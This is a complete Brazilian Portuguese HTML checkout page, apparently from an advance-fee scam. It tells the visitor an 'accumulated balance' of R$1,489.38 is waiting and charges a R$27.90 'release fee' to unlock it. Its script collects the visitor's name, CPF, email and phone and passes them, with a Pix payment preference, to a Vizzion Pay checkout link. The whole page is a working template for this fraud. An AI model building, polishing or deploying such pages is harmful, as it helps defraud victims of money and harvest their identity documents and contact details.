<!DOCTYPE html>
<html lang="pt-br">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Resumo Final</title>
<style>
    /* --- CSS FIEL AO SEU DESIGN (Mantido) --- */
    * { margin: 0; padding: 0; box-sizing: border-box; font-family: Arial, Helvetica, sans-serif; }

    /* Container Principal */
    .widget-container {
        background: linear-gradient(135deg, #ff5a2c, #ff7a4f);
        display: flex;
        justify-content: center;
        padding: 40px 20px;
        min-height: 100vh;
        width: 100%;
    }

    .container-resumo {
        background: #fff;
        max-width: 420px;
        width: 100%;
        border-radius: 20px;
        padding: 25px;
        box-shadow: 0 20px 40px rgba(0,0,0,0.15);
    }

    /* Cabe√ßalho */
    .header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 20px; }
    .header h1 { font-size: 20px; color: #333; }
    .saldo-pill { background: #000; color: #fff; padding: 6px 12px; border-radius: 20px; font-size: 13px; font-weight: bold; }

    /* Cards */
    .card { background: #f8f8f8; padding: 18px; border-radius: 12px; margin-bottom: 18px; }
    .destaque { background: #fff3ef; border-left: 4px solid #ff5a2c; }
    .card h3 { margin-bottom: 12px; font-size: 14px; color: #444; }
    .card p { font-size: 13px; color: #666; line-height: 1.4; }

    /* Linhas de Valores */
    .linha { display: flex; justify-content: space-between; margin-bottom: 10px; font-size: 14px; color: #555; }
    .linha strong { color: #333; }
    .total { border-top: 1px solid #ddd; padding-top: 8px; font-weight: bold; color: #333; }

    /* Resumo Final */
    .resumo { background: #fff; border: 1px solid #eee; }
    .desconto strong { color: #e63946; }
    .total-final strong { color: #2a9d8f; font-size: 16px; }

    /* INPUTS (Adicionados Email e Telefone que a Vizzion exige) */
    .input-group { margin-bottom: 12px; }
    .input-field {
        width: 100%;
        padding: 12px;
        border: 1px solid #ddd;
        border-radius: 8px;
        background: #fff;
        font-size: 14px;
        outline: none;
        transition: 0.3s;
    }
    .input-field:focus { border-color: #ff5a2c; }
    .label-input { font-size: 12px; font-weight: bold; color: #666; margin-bottom: 4px; display: block; }

    /* Bot√£o CTA */
    .cta {
        width: 100%;
        padding: 16px;
        background: #ff5a2c;
        border: none;
        border-radius: 10px;
        color: #fff;
        font-weight: bold;
        font-size: 16px;
        cursor: pointer;
        transition: .3s;
        text-transform: uppercase;
        box-shadow: 0 5px 15px rgba(255, 90, 44, 0.3);
    }
    .cta:hover { background: #e04e26; transform: translateY(-2px); }
    .cta:disabled { background: #ccc; cursor: wait; transform: none; box-shadow: none; }

    .seguranca { text-align: center; margin-top: 15px; font-size: 12px; color: #888; }

    @media (max-width: 400px) { .container-resumo { padding: 20px; } }
</style>

<div class="widget-container">
    <div class="container-resumo">

        <div class="header">
            <h1>Resumo Final</h1>
            <div class="saldo-pill">R$ 1.489,38</div>
        </div>

        <div class="card destaque">
            <h2>Consolida√ß√£o de valores</h2>
            <p>Confirme seus dados abaixo para liberar o saldo acumulado.</p>
        </div>

        <div class="card" id="form_dados">
            <h3>Seus Dados</h3>
            
            <div class="input-group">
                <span class="label-input">Nome Completo</span>
                <input type="text" id="nome_pagador" class="input-field" placeholder="Digite seu nome">
            </div>
            
            <div class="input-group">
                <span class="label-input">CPF</span>
                <input type="tel" id="cpf_pagador" class="input-field" placeholder="000.000.000-00" maxlength="14">
            </div>

            <div class="input-group">
                <span class="label-input">E-mail</span>
                <input type="email" id="email_pagador" class="input-field" placeholder="seu@email.com">
            </div>

            <div class="input-group">
                <span class="label-input">WhatsApp/Celular</span>
                <input type="tel" id="tel_pagador" class="input-field" placeholder="(00) 00000-0000" maxlength="15">
            </div>
        </div>

        <div class="card resumo">
            <div class="linha">
                <span>Saldo Bruto</span>
                <strong>R$ 1.489,38</strong>
            </div>
            <div class="linha desconto">
                <span>Abatimentos</span>
                <strong>- R$ 0,00</strong>
            </div>
            <div class="linha total-final" style="border-top:1px solid #eee; padding-top:10px; margin-top:5px;">
                <span>Taxa Final de Libera√ß√£o</span>
                <strong style="color: #ff5a2c;">R$ 27,90</strong>
            </div>
        </div>

        <button class="cta" id="btn_pagar">
            Prosseguir para Pagamento
        </button>

        <p class="seguranca">
            üîí Pagamento processado pela Vizzion Pay
        </p>

    </div>
</div>

<script>
document.addEventListener("DOMContentLoaded", function() {
    const btn = document.getElementById("btn_pagar");
    
    // Configura√ß√µes do seu Checkout Vizzion
    const checkoutUrl = "https://checkout.vizzionpay.com/checkout/cmlfjk1pf04621spmx962rpch";
    const offerCode = "ZG14WV9"; 

    // M√°scaras de Input (Melhora a experi√™ncia)
    const inputCpf = document.getElementById("cpf_pagador");
    const inputTel = document.getElementById("tel_pagador");

    inputCpf.addEventListener('input', function(e) {
        let v = e.target.value.replace(/\D/g, "");
        if (v.length > 11) v = v.slice(0, 11);
        e.target.value = v.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, "$1.$2.$3-$4");
    });

    inputTel.addEventListener('input', function(e) {
        let v = e.target.value.replace(/\D/g, "");
        if (v.length > 11) v = v.slice(0, 11);
        e.target.value = v.replace(/(\d{2})(\d{5})(\d{4})/, "($1) $2-$3");
    });

    if (btn) {
        btn.addEventListener("click", function(e) {
            e.preventDefault();

            // 1. Captura
            const nome = document.getElementById("nome_pagador").value.trim();
            const cpf = document.getElementById("cpf_pagador").value.replace(/\D/g, "");
            const email = document.getElementById("email_pagador").value.trim();
            const tel = document.getElementById("tel_pagador").value.replace(/\D/g, "");

            // 2. Valida√ß√£o
            if (nome.length < 3 || cpf.length < 11 || email.length < 5 || tel.length < 10) {
                alert("Por favor, preencha todos os dados corretamente.");
                return;
            }

            // 3. Feedback Visual
            btn.innerHTML = "REDIRECIONANDO...";
            btn.disabled = true;
            btn.style.opacity = "0.7";

            // 4. Montagem do Link Inteligente (Preenche o checkout da Vizzion)
            // Tenta os par√¢metros padr√µes de mercado (name, email, doc, phone)
            const params = new URLSearchParams({
                offer: offerCode,
                name: nome,
                email: email,
                document: cpf, // Tenta 'document' (padr√£o comum)
                cpf: cpf,      // Tenta 'cpf' (caso Vizzion use este)
                phone: tel,
                payment_method: 'pix' // Sugere Pix
            });

            // 5. Redirecionamento Seguro
            window.location.href = `${checkoutUrl}?${params.toString()}`;
        });
    }
});
</script>
</body>
</html>
